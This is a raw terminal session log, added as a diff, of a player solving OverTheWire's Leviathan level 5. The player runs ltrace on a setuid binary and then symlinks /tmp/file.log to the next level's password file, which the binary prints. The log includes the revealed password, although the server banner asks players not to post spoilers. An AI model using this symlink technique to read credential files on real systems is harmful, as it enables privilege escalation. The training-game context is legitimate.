@@ -1,0 +1,169 @@
+PS C:\Users\c2sha> ssh -p 2223 leviathan5@leviathan.labs.overthewire.org
+                   _            _       _   _
+                  | | _____   _(_) __ _| |_| |__   __ _ _ __
+                  | |/ _ \ \ / / |/ _` | __| '_ \ / _` | '_ \
+                  | |  __/\ V /| | (_| | |_| | | | (_| | | | |
+                  |_|\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|
+
+
+                      This is an OverTheWire game server.
+            More information on http://www.overthewire.org/wargames
+
+leviathan5@leviathan.labs.overthewire.org's password:
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+leviathan5@gibson:~$ ls
+leviathan5
+leviathan5@gibson:~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Apr 10 14:23 .
+drwxr-xr-x 83 root       root        4096 Apr 10 14:24 ..
+-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan6 leviathan5 15144 Apr 10 14:23 leviathan5
+-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
+leviathan5@gibson:~$ ./leviathan5
+Cannot find /tmp/file.log
+leviathan5@gibson:~$ ltrace ./leviathan5
+__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                   = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)             = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+leviathan5@gibson:~$ touch /tmp/file.log ; echo "hello" > /tmp/file.log
+leviathan5@gibson:~$ ltrace ./leviathan5
+__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                   = 0x804d1a0
+fgetc(0x804d1a0)                              = 'h'
+feof(0x804d1a0)                               = 0
+putchar(104, 0x804a008, 0, 0)                 = 104
+fgetc(0x804d1a0)                              = 'e'
+feof(0x804d1a0)                               = 0
+putchar(101, 0x804a008, 0, 0)                 = 101
+fgetc(0x804d1a0)                              = 'l'
+feof(0x804d1a0)                               = 0
+putchar(108, 0x804a008, 0, 0)                 = 108
+fgetc(0x804d1a0)                              = 'l'
+feof(0x804d1a0)                               = 0
+putchar(108, 0x804a008, 0, 0)                 = 108
+fgetc(0x804d1a0)                              = 'o'
+feof(0x804d1a0)                               = 0
+putchar(111, 0x804a008, 0, 0)                 = 111
+fgetc(0x804d1a0)                              = '\n'
+feof(0x804d1a0)                               = 0
+putchar(10, 0x804a008, 0, 0hello
+)                  = 10
+fgetc(0x804d1a0)                              = '\377'
+feof(0x804d1a0)                               = 1
+fclose(0x804d1a0)                             = 0
+getuid()                                      = 12005
+setuid(12005)                                 = 0
+unlink("/tmp/file.log")                       = 0
++++ exited (status 0) +++
+leviathan5@gibson:~$ touch /tmp/file.log ; echo "hello" > /tmp/file.log
+leviathan5@gibson:~$ ./leviathan5
+hello
+leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@gibson:~$ cat /tmp/file.log
+cat: /tmp/file.log: Permission denied
+leviathan5@gibson:~$ touch /tmp/file.log ; echo "hello" > /tmp/file.log
+touch: cannot touch '/tmp/file.log': Operation not permitted
+-bash: /tmp/file.log: Operation not permitted
+leviathan5@gibson:~$ touch /tmp/file.log ; echo "hello" > /tmp/file.log
+touch: cannot touch '/tmp/file.log': Operation not permitted
+-bash: /tmp/file.log: Operation not permitted
+leviathan5@gibson:~$ cat /tmp/file.log
+cat: /tmp/file.log: Permission denied
+leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+ln: failed to create symbolic link '/tmp/file.log': File exists
+leviathan5@gibson:~$ cat file.log
+cat: file.log: No such file or directory
+leviathan5@gibson:~$ cat /tmp/file.log
+cat: /tmp/file.log: Permission denied
+leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+ln: failed to create symbolic link '/tmp/file.log': File exists
+leviathan5@gibson:~$ ./leviathan5
+szo7HDB88w
+timed out waiting for input: auto-logout
+Connection to leviathan.labs.overthewire.org closed.
